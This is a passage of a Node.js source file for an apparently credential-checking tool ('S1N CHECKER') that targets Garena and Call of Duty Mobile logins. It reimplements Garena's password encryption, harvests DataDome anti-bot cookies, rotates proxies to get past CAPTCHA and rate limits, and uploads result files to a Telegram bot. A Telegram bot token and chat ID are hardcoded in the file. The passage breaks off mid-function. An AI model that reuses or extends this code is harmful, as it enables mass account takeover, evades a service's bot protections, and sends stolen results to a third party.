
// server.js
const os = require('os');
const sys = { // Partial sys emulation
    exit: (code) => {
        const message = `sys.exit(${code}) called. This indicates a critical issue that would halt a CLI. In API, throwing error.`;
        console.warn(message);
        // Throw a specific error type that can be caught by a global Express error handler
        const err = new Error(`EXIT_REQUESTED_CODE_${code}`);
        err.isSysExit = true;
        err.exitCode = code;
        throw err;
    },
    stdin: process.stdin, // Not used in API
    stdout: process.stdout, // For console logging
    stderr: process.stderr, // For console error logging
    version: process.version,
};
const re = { // RegExp helper, though direct JS RegExp is usually used
    compile: (pattern, flags) => new RegExp(pattern, flags),
    search: (pattern, text) => {
        if (typeof text !== 'string') return null;
        const regex = (typeof pattern === 'string') ? new RegExp(pattern) : pattern;
        return regex.exec(text);
    },
    match: (pattern, text) => {
        if (typeof text !== 'string') return null;
        // Python's re.match checks for a match only at the beginning of the string.
        // This implementation uses exec, which finds a match anywhere.
        // For true re.match behavior, the pattern should start with '^'.
        const regex = (typeof pattern === 'string') ? new RegExp(pattern) : pattern;
        return regex.exec(text);
    },
    sub: (pattern, repl, text) => {
        if (typeof text !== 'string') return String(text); // Or throw error, returning text might be unexpected
        const regex = (typeof pattern === 'string') ? new RegExp(pattern, 'g') : pattern; // Assuming global replace
        return text.replace(regex, repl);
    },
    escape: (str) => {
        if (typeof str !== 'string') return '';
        return str.replace(/[.*+?^${}()|[\]\\]/g, '\\$&'); // Basic regex escape
    }
};
const time = {
    time: () => Math.floor(Date.now() / 1000),
    sleep: (seconds) => new Promise(resolve => setTimeout(resolve, seconds * 1000)),
};
const json = JSON; // Direct mapping
const hashlib = require('crypto-js'); // Using crypto-js for MD5, SHA256
const random = {
    randint: (a, b) => Math.floor(Math.random() * (b - a + 1)) + a,
    choice: (arr) => {
        if (!arr || arr.length === 0) return undefined;
        return arr[Math.floor(Math.random() * arr.length)];
    },
    shuffle: (array) => { // Fisher-Yates shuffle
        if (!Array.isArray(array)) return;
        for (let i = array.length - 1; i > 0; i--) {
            const j = Math.floor(Math.random() * (i + 1));
            [array[i], array[j]] = [array[j], array[i]];
        }
    }
};

// Logging - basic console logging to emulate Python's logging
const logging = {
    DEBUG: 10, INFO: 20, WARNING: 30, ERROR: 40, CRITICAL: 50,
    _level: 20, // Default to INFO
    _log_file_path: null,
    _fs: require('fs'),
    _path: require('path'),

    basicConfig: ({ level, format, handlers, force }) => { // format and force are not used yet
        if (level !== undefined) logging._level = level;
        if (handlers && Array.isArray(handlers)) {
            for (const handler of handlers) {
                if (handler instanceof FileHandler && handler.filename) { // Check instanceof
                    logging._log_file_path = handler.filename;
                    try {
                        const logDir = logging._path.dirname(logging._log_file_path);
                        if (!logging._fs.existsSync(logDir)) {
                            logging._fs.mkdirSync(logDir, { recursive: true });
                        }
                    } catch (e) { console.error("Error creating log directory:", e.message); }
                }
            }
        }
    },
    _log: (level, levelName, args, funcName = '', lineno = '', filename = '') => { // funcName, lineno, filename not used
        if (level >= logging._level) {
            const messageContent = args.map(arg => {
                if (arg instanceof Error) return arg.stack || arg.message;
                if (typeof arg === 'object' && arg !== null) {
                    try { return json.stringify(arg, null, 2); } // Pretty print objects
                    catch (e) { return '[Unserializable Object]'; }
                }
                return String(arg);
            }).join(' ');

            const timestamp = new Date().toISOString();
            // Format similar to Python's default: %(asctime)s - %(levelname)s - %(message)s
            const logMessage = `${timestamp} - ${levelName} - ${messageContent}`;

            if (level >= logging.ERROR) { // ERROR or CRITICAL
                console.error(logMessage);
            } else if (level === logging.WARNING) {
                console.warn(logMessage);
            } else { // DEBUG or INFO
                console.log(logMessage);
            }

            if (logging._log_file_path) {
                try {
                    logging._fs.appendFileSync(logging._log_file_path, logMessage + '\n', 'utf-8');
                } catch (e) { console.error("Error writing to log file:", e.message); }
            }
        }
    },
    debug: (...args) => logging._log(logging.DEBUG, 'DEBUG', args),
    info: (...args) => logging._log(logging.INFO, 'INFO', args),
    warning: (...args) => logging._log(logging.WARNING, 'WARNING', args),
    error: (...args) => logging._log(logging.ERROR, 'ERROR', args),
    critical: (...args) => logging._log(logging.CRITICAL, 'CRITICAL', args),
    exception: (...args) => {
        let msgParts = [];
        let errStack = '';

        for (const arg of args) {
            if (arg instanceof Error) {
                errStack = arg.stack || String(arg);
            } else {
                msgParts.push((typeof arg === 'object' && arg !== null) ? json.stringify(arg, null, 2) : String(arg));
            }
        }
        const message = msgParts.join(' ');
        // Construct final log message, ensuring error stack is prominent
        const finalLogMessage = message && errStack ? `${message}\n${errStack}` : (errStack || message || "Exception logged with no message or error object.");
        logging._log(logging.ERROR, 'ERROR', [finalLogMessage]); // Pass as a single string element in array
    },
    getLevelName: (level) => {
        for (const name in logging) {
            if (logging[name] === level && typeof logging[name] === 'number') return name;
        }
        return String(level);
    },
    getLogger: () => ({ level: logging._level }) // Simplified getLogger
};

class FileHandler { // Simple class for configuration
    constructor(filename, encoding = 'utf-8') { // Added default encoding
        this.filename = filename;
        this.encoding = encoding;
    }
}
logging.FileHandler = FileHandler;


const urllib = { // Partial urllib emulation
    parse: require('url'), // Node's built-in url module
    request: require('axios'), // Using axios for requests
};
urllib.parse.quote = encodeURIComponent;
urllib.parse.unquote = decodeURIComponent;
urllib.parse.urlencode = (params) => {
    if (typeof params !== 'object' || params === null) return '';
    return new URLSearchParams(params).toString();
};
// For parsing full URLs, new URL(urlString) is preferred over legacy url.parse
urllib.parse.urlparse = (urlString) => {
    try { return new URL(urlString); }
    catch (e) { return urllib.parse.parse(urlString); /* Fallback to legacy for partials if necessary */ }
};
urllib.parse.parse_qs = (qs) => {
    if (typeof qs !== 'string') return {};
    return Object.fromEntries(new URLSearchParams(qs));
};

const platform = {
    system: () => os.platform(),
    release: () => os.release(),
};
const axios = require('axios');
// const he = require('he'); // Removed as it was not used; local htmlEscape is used.
const FormData = require('form-data');
const fs = require('fs'); // Node's built-in fs
const fsExtra = require('fs-extra'); // For ensureDirSync etc.
const path = require('path');
const crypto = require('crypto'); // Node.js built-in crypto for AES

const { CookieJar } = require('tough-cookie');
const { wrapper: axiosCookieJarSupport } = require('axios-cookiejar-support');
axiosCookieJarSupport(axios); // Apply cookie jar support to the default axios instance

// colorama constants (ANSI escape codes)
const Fore = {
    RED: '\x1b[31m', GREEN: '\x1b[32m', YELLOW: '\x1b[33m', BLUE: '\x1b[34m',
    MAGENTA: '\x1b[35m', CYAN: '\x1b[36m', WHITE: '\x1b[37m', LIGHTBLACK_EX: '\x1b[90m',
};
const Style = {
    BRIGHT: '\x1b[1m', RESET_ALL: '\x1b[0m', DIM: '\x1b[2m',
};
const Back = {
    RED: '\x1b[41m',
};
// colorama's init is a no-op here as ANSI codes work directly in most Node terminals.
const init = ({ autoreset }) => { /* autoreset not implemented, RESET_ALL must be used manually */ };
init({ autoreset: true }); // Calling it for completeness, though it does nothing.

const COLORS = {
    "RED": Fore.RED, "GREEN": Fore.GREEN, "YELLOW": Fore.YELLOW, "BLUE": Fore.BLUE,
    "MAGENTA": Fore.MAGENTA, "CYAN": Fore.CYAN, "WHITE": Fore.WHITE, "GREY": Fore.LIGHTBLACK_EX,
    "BOLD": Style.BRIGHT, "RESET": Style.RESET_ALL, "HIGHLIGHT": "\x1b[7m",
    "RED_BG": Style.BRIGHT + Fore.WHITE + Back.RED,
    "BLUE_BOLD": Fore.BLUE + Style.BRIGHT,
};


const { DateTime, Settings } = require('luxon');
Settings.defaultZone = 'utc'; // Set default timezone for Luxon

try {
    // Crypto is a built-in module, this check is more of a sanity check.
    if (!crypto || typeof crypto.createCipheriv !== 'function') {
      throw new Error("Node.js crypto module is not available or incomplete.");
    }
} catch (e) {
    console.error(`${COLORS.RED_BG}ERROR: CRYPTO MODULE NOT FOUND OR BROKEN. THIS IS UNEXPECTED IN NODE.JS. ${e.message}${COLORS.RESET}`);
    sys.exit(1); // This will throw an error and be caught by the global error handler if in request, or crash startup.
}

const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || "7671609285:AAFYtH0qVuRWWoJTI8gcCriFEAVu11eMayo";
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID || "6542321044";

const DATADOME_JSON_FILE = path.resolve(__dirname, ".datadome.json"); // Use absolute path
const MAX_DATADOMES_IN_JSON = 20;

const NEW_COOKIES_JSON_FILE = path.resolve(__dirname, ".newCookies.json"); // Use absolute path
const MAX_COOKIE_SETS_IN_JSON = 20;

// Constants for check_account logic (kept as is, assuming they are tuned)
const MAX_DATADOME_RETRIES_FOR_ACCOUNT = 3;
const PROXY_RETRY_LIMIT = 3;
const REQUEST_TIMEOUT = 30; // seconds

const RETRYABLE_PROXY_ERROR_PREFIXES = [
    "[🤖] CAPTCHA", "[⏱️]", "[🔴] CONNECTION ERROR", "[🔌]",
    "[📉] HTTP ERROR 50", "[📉] LOGIN HTTP ERROR 50",
    "[🚫] LOGIN FORBIDDEN (403)", "[🚫] PRELOGIN FORBIDDEN (403)",
    "[🚦] RATE LIMITED (429)", "[🚦] PRELOGIN RATE LIMITED (429)",
];
const GARENA_COUNTRY_MAP = {
    "ID": "INDONESIA", "SG": "SINGAPORE", "MY": "MALAYSIA",
    "PH": "PHILIPPINES", "TH": "THAILAND", "VN": "VIETNAM",
    "TW": "TAIWAN", "INDIA": "INDIA", "IND": "INDIA",
    "INDONESIA": "INDONESIA", "SINGAPORE": "SINGAPORE", "MALAYSIA": "MALAYSIA",
    "PHILIPPINES": "PHILIPPINES", "THAILAND": "THAILAND", "VIETNAM": "VIETNAM",
    "TAIWAN": "TAIWAN",
    "US": "UNITED STATES", "UNITED STATES": "UNITED STATES",
    "BR": "BRAZIL", "BRAZIL": "BRAZIL",
};

const APK_URL = "https://auth.garena.com/api/login"; // Base URL, params added later
const REDIRECT_URL = "https://auth.codm.garena.com/auth/auth/callback_n?site=https://api-delete-request.codm.garena.co.id/oauth/callback/";

class _HardcodedCookies {
    static get_cookies() {
        // Example cookies, should be valid or updated if this source is relied upon.
        return {
            "_ga_57E30E1PMN": "GS1.2.1729857978.1.0.1729857978.0.0.0",
            "_ga": "GA1.1.807684783.1745020674",
            // ... other cookies
        };
    }
}

function load_json_from_file(filePath, logName = "data") {
    if (!fs.existsSync(filePath)) {
        return []; // Return empty array if file doesn't exist (common for lists)
    }
    try {
        const fileContent = fs.readFileSync(filePath, 'utf-8');
        if (!fileContent.trim()) return []; // Handle empty file
        const data = json.parse(fileContent);
        return data; // Caller should validate structure (e.g., Array.isArray)
    } catch (e) {
        logging.error(`Error loading ${logName} from ${filePath}: ${e.message}`);
        return []; // Return empty array on error
    }
}

function save_json_to_file(filePath, data, logName = "data") {
    try {
        fs.writeFileSync(filePath, json.stringify(data, null, 2), 'utf-8');
        logging.info(`Saved/Updated ${logName} to ${filePath}`);
    } catch (e) {
        logging.error(`Error writing ${logName} to ${filePath}: ${e.message}`);
    }
}

function load_cookie_sets_from_storage() {
    const data = load_json_from_file(NEW_COOKIES_JSON_FILE, "cookie sets");
    if (Array.isArray(data)) {
        return data.filter(item => typeof item === 'object' && item !== null && Object.keys(item).length > 0);
    }
    logging.warning(`${NEW_COOKIES_JSON_FILE} does not contain a list of cookie sets.`);
    return [];
}

function save_cookie_set_to_storage(new_cookie_set) {
    if (typeof new_cookie_set !== 'object' || new_cookie_set === null || Object.keys(new_cookie_set).length === 0) {
        logging.debug("Attempted to save an empty or invalid cookie set. Skipping.");
        return;
    }
    let cookie_sets = load_cookie_sets_from_storage();
    // Avoid saving duplicates
    const newCookieSetString = JSON.stringify(new_cookie_set);
    if (!cookie_sets.some(cs => JSON.stringify(cs) === newCookieSetString)) {
        cookie_sets.push(new_cookie_set);
        while (cookie_sets.length > MAX_COOKIE_SETS_IN_JSON) {
            cookie_sets.shift(); // Remove oldest
        }
        save_json_to_file(NEW_COOKIES_JSON_FILE, cookie_sets, "cookie sets");
    }
}

function starting_cookies() {
    let cookies_to_use = null;
    let source_message = "";

    const given_cookies = _HardcodedCookies.get_cookies();
    if (typeof given_cookies === 'object' && given_cookies !== null && Object.keys(given_cookies).length > 0) {
        save_cookie_set_to_storage(given_cookies); // Store hardcoded ones if they are new
    } else {
        logging.warning("Hardcoded cookies from _HardcodedCookies are invalid or empty.");
    }

    try {
        const changeCookiePath = path.join(__dirname, 'change_cookie.js');
        if (fs.existsSync(changeCookiePath)) {
            const change_cookie = require(changeCookiePath); // This will be cached by require
            if (change_cookie && typeof change_cookie.get_cookies === 'function') {
                const session_cookies = change_cookie.get_cookies();
                if (typeof session_cookies === 'object' && session_cookies !== null && Object.keys(session_cookies).length > 0) {
                    cookies_to_use = session_cookies;
                    source_message = "Using cookies from 'change_cookie.js' module for this session.";
                    logging.info(source_message);
                    save_cookie_set_to_storage(cookies_to_use);
                } else {
                    logging.warning("'change_cookie.get_cookies()' returned empty or invalid data.");
                }
            } else {
                logging.warning("'change_cookie.js' found, but 'get_cookies' is missing or not a function.");
            }
        } else {
             logging.info("Optional 'change_cookie.js' module not found. This is not an error.");
        }
    } catch (e) {
        if (e.code === 'MODULE_NOT_FOUND' && e.message.includes('change_cookie.js')) {
            logging.info("Optional 'change_cookie.js' module not found. Proceeding without it.");
        } else {
            logging.error(`Error loading or using cookies from 'change_cookie.js': ${e.message}.`);
        }
    }

    if (!cookies_to_use) {
        const stored_cookie_sets = load_cookie_sets_from_storage();
        if (stored_cookie_sets.length > 0) {
            cookies_to_use = random.choice(stored_cookie_sets); // random.choice handles empty array by returning undefined
            if (cookies_to_use) {
                source_message = `Using a random stored cookie set from '${path.basename(NEW_COOKIES_JSON_FILE)}' for this session.`;
                logging.info(source_message);
            } else {
                logging.warning(`Could not select a cookie from stored sets in '${path.basename(NEW_COOKIES_JSON_FILE)}'.`);
            }
        } else {
            logging.info(`No valid cookie sets found in '${path.basename(NEW_COOKIES_JSON_FILE)}'.`);
        }
    }

    if (!cookies_to_use) { // Fallback to hardcoded if others failed
        if (typeof given_cookies === 'object' && given_cookies !== null && Object.keys(given_cookies).length > 0) {
            cookies_to_use = given_cookies;
            source_message = "Using 'given' (hardcoded/snippet) cookies as a fallback.";
            logging.info(source_message);
        } else {
            logging.error("All cookie sources (change_cookie.js, stored, hardcoded) failed or yielded no cookies. Using empty cookies for session.");
            cookies_to_use = {}; // Ensure it's an object
            source_message = "All cookie sources failed. Using empty cookies for session.";
        }
    }
    
    // Final sanity check
    if (typeof cookies_to_use !== 'object' || cookies_to_use === null) { 
        logging.critical(`Cookie acquisition critically resulted in non-object type: ${typeof cookies_to_use}. Using empty object as failsafe.`);
        cookies_to_use = {};
        source_message += " (CRITICAL_FALLBACK: Cookies became non-object, reset to empty)";
    }

    logging.info(`Final cookie source decision: ${source_message || "No specific source message generated, check logs."}`);
    return [cookies_to_use, source_message];
}

function strip_ansi_codes(text) {
    if (typeof text !== 'string') return String(text); // Or return as is: text;
    const ansi_escape = /\x1B(?:[@-Z\\-_]|\[[0-?]*[ -/]*[@-~])/g;
    return text.replace(ansi_escape, '');
}

function get_current_timestamp() { // Returns string timestamp
    return String(Math.floor(Date.now() / 1000));
}

function generate_md5_hash(password) {
    if (typeof password !== 'string') password = String(password);
    return hashlib.MD5(password).toString(hashlib.enc.Hex);
}

function generate_decryption_key(password_md5, v1, v2) {
    const intermediate_hash = hashlib.SHA256(String(password_md5) + String(v1)).toString(hashlib.enc.Hex);
    return hashlib.SHA256(intermediate_hash + String(v2)).toString(hashlib.enc.Hex);
}

function encrypt_aes_256_ecb(plaintext_hex, key_hex) {
    // IMPORTANT: This function truncates the ciphertext to 16 bytes (32 hex characters).
    // Standard AES encryption of 16 bytes plaintext (plus 16 bytes PKCS7 padding = 32 bytes total)
    // would result in 32 bytes of ciphertext (64 hex characters).
    // This truncation is highly unusual and implies the receiving system expects this specific behavior.
    // If this is not intended, the `.substring(0, 32)` should be removed.
    try {
        const keyBuffer = Buffer.from(key_hex, 'hex');
        if (keyBuffer.length !== 32) { // 256 bits = 32 bytes
            throw new Error(`AES key must be 32 bytes (256 bits), got ${keyBuffer.length} bytes.`);
        }

        const plaintextBuffer = Buffer.from(plaintext_hex, 'hex');
        const blockSize = 16; // AES block size is 16 bytes

        // Manual PKCS#7 padding: if plaintext is already a multiple of block size, a full block of padding is added.
        const paddingLength = blockSize - (plaintextBuffer.length % blockSize || blockSize);
        const paddingBuffer = Buffer.alloc(paddingLength, paddingLength); // Each byte of padding is the padding length
        
        const paddedPlaintext = Buffer.concat([plaintextBuffer, paddingBuffer]);

        const cipher = crypto.createCipheriv('aes-256-ecb', keyBuffer, null); // ECB mode, null IV
        cipher.setAutoPadding(false); // We are doing manual padding

        let encrypted = cipher.update(paddedPlaintext, null, 'hex');
        encrypted += cipher.final('hex');

        // Truncate to the first 16 bytes (32 hex characters) of the ciphertext.
        return encrypted.substring(0, 32);
    } catch (e) {
         const safePlaintext = typeof plaintext_hex === 'string' ? plaintext_hex.substring(0,10) : 'N/A';
         const safeKey = typeof key_hex === 'string' ? key_hex.substring(0,10) : 'N/A';
         logging.error(`AES ENCRYPTION ERROR: ${e.message}. PLAINTEXT_HEX: ${safePlaintext}..., KEY_HEX: ${safeKey}...`);
         throw e; // Re-throw to be handled by caller
    }
}

function get_encrypted_password(password, v1, v2) {
    const password_md5 = generate_md5_hash(password); // This is already 32 hex chars (16 bytes)
    const decryption_key_hex = generate_decryption_key(password_md5, v1, v2); // This is 64 hex chars (32 bytes)
    return encrypt_aes_256_ecb(password_md5, decryption_key_hex);
}

function get_request_data(initial_cookies_tuple) {
    let [cookies] = initial_cookies_tuple;
    if (typeof cookies !== 'object' || cookies === null) {
        logging.warning("get_request_data received non-object cookies. Using empty object as fallback.");
        cookies = {};
    }
    const user_agent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36';
    const headers = {
        'Host': 'auth.garena.com', 'Connection': 'keep-alive',
        'sec-ch-ua': '"Google Chrome";v="129", "Not)A;Brand";v="8", "Chromium";v="129"',
        'sec-ch-ua-mobile': '?0', 'User-Agent': user_agent, 'sec-ch-ua-platform': '"Windows"',
        'Accept': 'application/json, text/plain, */*', 'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-Mode': 'cors', 'Sec-Fetch-Dest': 'empty',
        'Referer': 'https://auth.garena.com/universal/oauth?all_platforms=1&response_type=token&locale=en-SG&client_id=100082&redirect_uri=' + urllib.parse.quote(REDIRECT_URL),
        'Accept-Encoding': 'gzip, deflate, br, zstd', 'Accept-Language': 'en-US,en;q=0.9'
    };
    return [cookies, headers];
}

function detect_captcha_in_response(response_text) {
    return typeof response_text === 'string' && response_text.toLowerCase().includes("captcha");
}

async function get_public_ip(proxies = null, timeout = REQUEST_TIMEOUT) {
    const axiosConfig = { timeout: timeout * 1000 };
    if (proxies) {
        const proxyConfig = buildAxiosProxyConfig(proxies);
        if (proxyConfig) axiosConfig.proxy = proxyConfig;
    }
    try {
        const response = await axios.get('https://api.ipify.org?format=json', axiosConfig);
        if (response.status !== 200 || !response.data || typeof response.data.ip !== 'string') {
            throw new Error(`HTTP error ${response.status} or invalid IP data`);
        }
        return response.data.ip;
    } catch (e) {
        logging.warning(`COULD NOT FETCH PUBLIC IP: ${e.message}`);
        return `IP FETCH ERROR (${e.constructor.name})`;
    }
}

function load_datadomes_from_storage() {
    const data = load_json_from_file(DATADOME_JSON_FILE, "datadomes");
    if (Array.isArray(data)) {
        return data.filter(item => typeof item === 'string' && item.trim().length > 0);
    }
    logging.warning(`${path.basename(DATADOME_JSON_FILE)} does not contain a list of datadomes.`);
    return [];
}

function save_datadome_to_storage(new_datadome) {
    if (typeof new_datadome !== 'string' || !new_datadome.trim()) {
        logging.debug("Attempted to save an empty or invalid datadome string. Skipping.");
        return;
    }
    // Avoid saving known error/captcha indicators as valid datadomes
    if (new_datadome.startsWith("[🤖]") || new_datadome.startsWith("[⚠️]")) {
        logging.warning(`Attempted to save an error/captcha string as a datadome: ${new_datadome.substring(0, 50)}`);
        return;
    }
    let datadomes = load_datadomes_from_storage();
    if (!datadomes.includes(new_datadome)) {
        datadomes.push(new_datadome);
        while (datadomes.length > MAX_DATADOMES_IN_JSON) {
            datadomes.shift(); // Remove oldest
        }
        save_json_to_file(DATADOME_JSON_FILE, datadomes, "datadomes");
    }
}

async function send_files_to_telegram(file_paths, bot_token, chat_id, base_caption = "S1N CHECKER RESULTS") {
    if (!bot_token || !chat_id || bot_token === "7671609285:AAFYtH0qVuRWWoJTI8gcCriFEAVu11eMayo" || chat_id === "6542321044") {
        logging.warning("TELEGRAM BOT TOKEN OR CHAT ID IS NOT CONFIGURED OR USING PLACEHOLDERS. SKIPPING FILE SENDING.");
        return;
    }
    if (!Array.isArray(file_paths) || file_paths.length === 0) {
        logging.info("NO FILES PROVIDED TO SEND TO TELEGRAM.");
        return;
    }

    logging.info(`Attempting to send ${file_paths.length} file(s) to Telegram chat ID ${chat_id.substring(0,4)}...`);
    let success_count = 0;
    let fail_count = 0;
    const api_url = `https://api.telegram.org/bot${bot_token}/sendDocument`;

    for (const file_path_item of file_paths) {
        if (typeof file_path_item !== 'string' || !fs.existsSync(file_path_item)) {
            logging.warning(`File not found or invalid path, cannot send to Telegram: ${file_path_item}`);
            fail_count += 1;
            continue;
        }
        
        const min_size_bytes = 20; // Minimal "useful" file size
        try {
            if (fs.statSync(file_path_item).size <= min_size_bytes) {
                logging.info(`Skipping empty or very small file for Telegram: ${path.basename(file_path_item)}`);
                // Do not increment fail_count, this is a valid skip.
                continue;
            }
        } catch (e) {
            logging.error(`Could not get size of file ${file_path_item}: ${e.message}`);
            fail_count += 1;
            continue;
        }

        const file_name = path.basename(file_path_item);
        // Telegram caption max length is 1024 characters
        const caption_text = `${base_caption.toUpperCase()}: ${file_name}`.substring(0, 1024);

        const form = new FormData();
        form.append('chat_id', chat_id);
        form.append('caption', caption_text);
        form.append('document', fs.createReadStream(file_path_item), file_name);
        
        try {
            const response = await axios.post(api_url, form, {
                headers: form.getHeaders(), // Important for FormData
                timeout: 60000 // 60 seconds timeout for file upload
            });
            
            if (response.data && response.data.ok) {
                logging.info(`Successfully sent ${file_name} to Telegram.`);
                success_count += 1;
            } else {
                const error_desc = response.data && response.data.description ? response.data.description : 'Unknown Telegram API error';
                logging.error(`Failed to send ${file_name} to Telegram: ${error_desc}`);
                fail_count += 1;
            }
        } catch (e) {
            if (e.code === 'ETIMEDOUT' || (e.response && e.response.status === 408) ) {
                 logging.error(`Timeout sending ${file_name} to Telegram.`);
            } else if (e.isAxiosError) {
                 logging.error(`Network/Request error sending ${file_name} to Telegram: ${strip_ansi_codes(e.message)}`);
                 if(e.response && e.response.data) logging.error(`Telegram Response: ${json.stringify(e.response.data)}`);
            } else {
                 logging.exception(`Unexpected error sending ${file_name} to Telegram:`, e);
            }
            fail_count += 1;
        } finally {
            await time.sleep(0.5); // Small delay between sends
        }
    }

    if (success_count > 0 || fail_count > 0) {
        logging.info(`TELEGRAM SEND SUMMARY: ${success_count} SUCCEEDED, ${fail_count} FAILED.`);
        if (fail_count > 0) {
             logging.warning(`Check logs for details on ${fail_count} failed Telegram sends.`);
        }
    }
}

function buildAxiosProxyConfig(proxies) {
    if (!proxies || typeof proxies !== 'object' || (!proxies.http && !proxies.https)) {
        return null;
    }
    const proxyUrlString = proxies.http || proxies.https;
    if (typeof proxyUrlString !== 'string') {
        logging.error(`Invalid proxy URL type: expected string, got ${typeof proxyUrlString}`);
        return null;
    }
    try {
        const proxyUrl = new URL(proxyUrlString);
        const config = {
            host: proxyUrl.hostname,
            port: parseInt(proxyUrl.port, 10), // Ensure port is an integer
            protocol: proxyUrl.protocol.slice(0, -1), // remove ':'
        };
        if (isNaN(config.port)) {
            logging.error(`Invalid proxy port: ${proxyUrl.port}`);
            return null;
        }
        if (proxyUrl.username || proxyUrl.password) {
            config.auth = {
                username: decodeURIComponent(proxyUrl.username),
                password: decodeURIComponent(proxyUrl.password),
            };
        }
        return config;
    } catch (e) {
        logging.error(`Invalid proxy URL format: ${proxyUrlString} - ${e.message}`);
        return null;
    }
}

async function get_datadome_cookie(proxies = null, timeout = REQUEST_TIMEOUT) {
    const url = 'https://dd.garena.com/js/';
    const headers = {
        'accept': '*/*', 'accept-encoding': 'gzip, deflate, br, zstd',
        'accept-language': 'en-US,en;q=0.9', 'cache-control': 'no-cache',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://account.garena.com', 'pragma': 'no-cache',
        'referer': 'https://account.garena.com/',
        'sec-ch-ua': '"Google Chrome";v="129", "Not)A;Brand";v="8", "Chromium";v="129"',
        'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty', 'sec-fetch-mode': 'cors', 'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36'
    };
    const payload = {
        'jsData': json.stringify({"ttst": random.randint(50, 150), "br_oh":1080, "br_ow":1920}),
        'eventCounters': '[]', 'jsType': 'ch', 'ddv': '4.35.4',
        'Referer': 'https://account.garena.com/', 'request': '%2F', 'responsePage': 'origin',
    };
    const data = urllib.parse.urlencode(payload); // Use helper for consistency

    const axiosConfig = {
        headers: headers,
        timeout: timeout * 1000,
        proxy: buildAxiosProxyConfig(proxies),
    };
    
    try {
        const response = await axios.post(url, data, axiosConfig);
        
        let response_json;
        let raw_response_data_str = "";

        if (typeof response.data === 'string') {
            raw_response_data_str = strip_ansi_codes(response.data);
            try {
                response_json = json.parse(raw_response_data_str);
            } catch (e) {
                if (detect_captcha_in_response(raw_response_data_str)) {
                    logging.warning(`CAPTCHA DETECTED IN DATADOME (NON-JSON STRING RESPONSE): ${raw_response_data_str.substring(0, 200)}`);
                    return "[🤖] CAPTCHA DETECTED (DATADOME RESPONSE BODY)";
                }
                logging.error(`Failed to parse datadome string response as JSON: ${e.message}. Snippet: ${raw_response_data_str.substring(0, 200)}`);
                return `[⚠️] DATADOME ERROR: NON-JSON RESPONSE (${e.message.substring(0,50)})`;
            }
        } else if (typeof response.data === 'object' && response.data !== null) {
            response_json = response.data;
            try { raw_response_data_str = strip_ansi_codes(json.stringify(response_json)); }
            catch (e) { raw_response_data_str = "[Unstringifiable JSON Object]";}
        } else {
            logging.error(`Unexpected datadome response data type: ${typeof response.data}. Status: ${response.status}`);
            return `[⚠️] DATADOME ERROR: UNEXPECTED RESPONSE DATA TYPE (${typeof response.data})`;
        }

        if (detect_captcha_in_response(raw_response_data_str)) {
            logging.warning(`CAPTCHA DETECTED IN DATADOME RESPONSE (parsed or stringified): ${raw_response_data_str.substring(0,200)}`);
            return "[🤖] CAPTCHA DETECTED (DATADOME PARSED/STRINGIFIED)";
        }
        if (response.status < 200 || response.status >= 300) { 
             throw new Error(`HTTP error ${response.status}`);
        }

        if (response_json && response_json.cookie) {
            const cookie_string = response_json.cookie;
            const match = /datadome=([^;]+)/.exec(cookie_string);
            if (match && match[1]) {
                const datadome_value = match[1];
                save_datadome_to_storage(datadome_value);
                return datadome_value;
            }
        }
        logging.warning(`Datadome response missing expected cookie or malformed: ${raw_response_data_str.substring(0,300)}`);
        return null; // Explicitly return null if cookie not found
    } catch (e) {
        const error_str = strip_ansi_codes(e.message);
        const resp_text_snippet = strip_ansi_codes(e.response && e.response.data ? String(e.response.data).substring(0,100) : "");

        if (detect_captcha_in_response(error_str) || detect_captcha_in_response(resp_text_snippet)) {
             logging.warning(`CAPTCHA DETECTED during datadome request/parse error: ${error_str} / ${resp_text_snippet}`);
             return "[🤖] CAPTCHA DETECTED (DATADOME REQUEST/PARSE ERROR)";
        }
        if (e.code === 'ECONNABORTED' || e.message.toLowerCase().includes('timeout')) { 
            logging.error(`Timeout getting datadome cookie: ${error_str}`);
            return "[⏱️] DATADOME TIMEOUT";
        }
        if (e.isAxiosError && !e.response) { 
            logging.error(`Connection error getting datadome cookie: ${error_str}`);
            return "[🔴] DATADOME CONNECTION ERROR";
        }
        // Log full error if not one of the above common cases
        logging.exception(`Failed to get datadome cookie:`, e);
        return `[⚠️] DATADOME ERROR: ${error_str.substring(0,100)}`;
    }
}

function parseSetCookies(setCookieHeader) {
    if (!setCookieHeader) return {};
    const cookies = {};
    try {
        const setCookieParser = require('set-cookie-parser');
        const parsed = setCookieParser.parse(setCookieHeader, { map: true }); // Use map option for easier access
        for (const name in parsed) {
            cookies[name] = parsed[name].value;
        }
    } catch (e) {
        logging.error(`Error parsing Set-Cookie header: ${e.message}. Header: ${String(setCookieHeader).substring(0,100)}`);
    }
    return cookies;
}
// ... (rest of the functions, applying similar robustness for JSON parsing and error handling)

// Helper for parsing Axios responses that might be JSON
function parseAxiosResponseData(responseData, context = "Response") {
    if (typeof responseData === 'object' && responseData !== null) {
        return { data: responseData, error: null, raw: null }; // Already an object
    }
    if (typeof responseData === 'string') {
        const cleanData = strip_ansi_codes(responseData);
        try {
            return { data: json.parse(cleanData), error: null, raw: cleanData };
        } catch (e) {
            // String, but not JSON. Return the raw string for other checks (e.g. CAPTCHA HTML)
            return { data: null, error: e, raw: cleanData };
        }
    }
    // Unexpected type
    const err = new Error(`Unexpected ${context} data type: ${typeof responseData}`);
    return { data: null, error: err, raw: String(responseData) };
}


async function show_level(access_token, selected_header, cookies_for_codm, proxies = null, timeout = REQUEST_TIMEOUT) {
    const callback_base_url = "https://auth.codm.garena.com/auth/auth/callback_n";
    const callback_params = {"site": "https://api-delete-request.codm.garena.co.id/oauth/callback/", "access_token": access_token};
    let headers = {
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", // Common browser accept
        "Accept-Encoding": "gzip, deflate, br", "Accept-Language": "en-US,en;q=0.9",
